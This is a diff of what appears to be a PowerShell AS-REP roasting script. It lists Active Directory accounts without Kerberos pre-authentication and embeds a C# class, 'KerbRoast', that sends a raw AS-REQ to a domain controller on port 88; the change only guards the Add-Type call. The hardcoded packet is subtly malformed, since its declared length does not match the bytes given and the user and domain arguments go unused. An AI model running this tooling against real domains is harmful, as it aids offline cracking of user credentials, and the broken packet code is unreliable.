@@ -7,43 +7,39 @@ foreach ($r in $results) {
     Write-Output "DONT_REQ_PREAUTH: $($r.Properties['samaccountname'][0])"
 }
 
-Add-Type -TypeDefinition @'
-using System;
-using System.Net;
-using System.Net.Sockets;
-public class KerbRoast {
-    public static string SendASREQ(string dc, string user, string domain) {
-        byte[] asreq = new byte[] {
-            0x30, 0x81, 0x9a,
-            0xa1, 0x03, 0x02, 0x01, 0x05,
-            0xa2, 0x03, 0x02, 0x01, 0x0a,
-            0xa3, 0x15, 0x30, 0x13,
-            0x30, 0x11, 0xa1, 0x04, 0x02, 0x02, 0x00, 0x80,
-            0xa2, 0x09, 0x04, 0x07, 0x30, 0x05, 0x02, 0x03, 0x00, 0x00, 0x17,
-            0xa4, 0x77, 0x30, 0x75,
-            0xa0, 0x07, 0x03, 0x05, 0x00, 0x40, 0x81, 0x00, 0x10,
-            0xa1, 0x13, 0x30, 0x11,
-            0xa0, 0x03, 0x02, 0x01, 0x01,
-            0xa1, 0x0a, 0x30, 0x08, 0x1b, 0x06
-        };
-        try {
-            using (var tcp = new TcpClient()) {
-                tcp.Connect(dc, 88);
-                var stream = tcp.GetStream();
-                byte[] len = BitConverter.GetBytes(IPAddress.HostToNetworkOrder(asreq.Length));
-                stream.Write(len, 0, 4);
-                stream.Write(asreq, 0, asreq.Length);
-                stream.Flush();
-                byte[] resp = new byte[4096];
-                int read = stream.Read(resp, 0, resp.Length);
-                return "KDC responded: " + read + " bytes";
-            }
-        } catch (Exception ex) {
-            return "KDC: " + ex.Message;
+if (-not ('KerbRoast' -as [type])) {
+    Add-Type -TypeDefinition @'
+    using System;
+    using System.Net;
+    using System.Net.Sockets;
+    public class KerbRoast {
+        public static string SendASREQ(string dc, string user, string domain) {
+            byte[] asreq = new byte[] {
+                0x30, 0x81, 0x9a, 0xa1, 0x03, 0x02, 0x01, 0x05,
+                0xa2, 0x03, 0x02, 0x01, 0x0a, 0xa3, 0x15, 0x30, 0x13,
+                0x30, 0x11, 0xa1, 0x04, 0x02, 0x02, 0x00, 0x80,
+                0xa2, 0x09, 0x04, 0x07, 0x30, 0x05, 0x02, 0x03, 0x00, 0x00, 0x17,
+                0xa4, 0x77, 0x30, 0x75, 0xa0, 0x07, 0x03, 0x05, 0x00, 0x40, 0x81, 0x00, 0x10,
+                0xa1, 0x13, 0x30, 0x11, 0xa0, 0x03, 0x02, 0x01, 0x01,
+                0xa1, 0x0a, 0x30, 0x08, 0x1b, 0x06
+            };
+            try {
+                using (var tcp = new TcpClient()) {
+                    tcp.Connect(dc, 88);
+                    var stream = tcp.GetStream();
+                    byte[] len = BitConverter.GetBytes(IPAddress.HostToNetworkOrder(asreq.Length));
+                    stream.Write(len, 0, 4);
+                    stream.Write(asreq, 0, asreq.Length);
+                    stream.Flush();
+                    byte[] resp = new byte[4096];
+                    int read = stream.Read(resp, 0, resp.Length);
+                    return "KDC responded: " + read + " bytes";
+                }
+            } catch (Exception ex) { return "KDC: " + ex.Message; }
         }
     }
+'@
 }
-'@ -ErrorAction SilentlyContinue
 
 $dc = $null
 try { $dc = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).DomainControllers[0].Name } catch {}
